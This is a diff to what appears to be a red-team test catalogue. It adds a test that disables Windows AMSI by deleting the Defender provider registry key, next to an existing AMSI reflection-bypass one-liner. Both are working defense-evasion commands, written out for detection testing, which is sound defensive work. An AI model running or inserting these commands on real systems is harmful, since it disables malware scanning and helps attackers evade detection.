@@ -6010,6 +6010,21 @@ defense-evasion:
         elevation_required: false
         command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
         cleanup_command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
+    - name: AMSI Bypass - Remove AMSI Provider Reg Key
+      description: "With administrative rights, an adversary can remove the AMSI Provider
+        registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis
+        test removes the Windows Defender provider registry key. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+          -Recurse
+
+'
+        cleanup_command: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+          -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
   T1107:
     technique:
       external_references:
